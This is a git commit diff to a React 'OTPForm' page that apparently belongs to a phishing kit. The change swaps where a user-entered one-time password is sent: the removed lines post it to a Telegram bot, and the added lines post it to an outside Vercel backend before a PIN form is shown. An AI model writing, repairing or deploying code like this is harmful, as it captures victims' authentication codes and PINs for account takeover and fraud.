cc8e3abc53136be0dd738532dd412454f2da8ae0
AboIslam123179 <tiktokqatr@gmail.com>
2025-10-01 03:55:59 +0300

    Update page.js

--- app/code/page.js
+++ app/code/page.js
@@ -54,17 +54,11 @@ export default function OTPForm() {
       sessionStorage.setItem("otp", otp);
 
       try {
-        const response = await fetch(
-          `https://api.telegram.org/bot${botToken}/sendMessage`,
-          {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message,
-            }),
-          }
-        );
+              const response = await fetch("https://wuaze-qata-backend.vercel.app/send", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ text: message }),
+      });
 
         if (response.ok) {
           setShowPinForm(true);
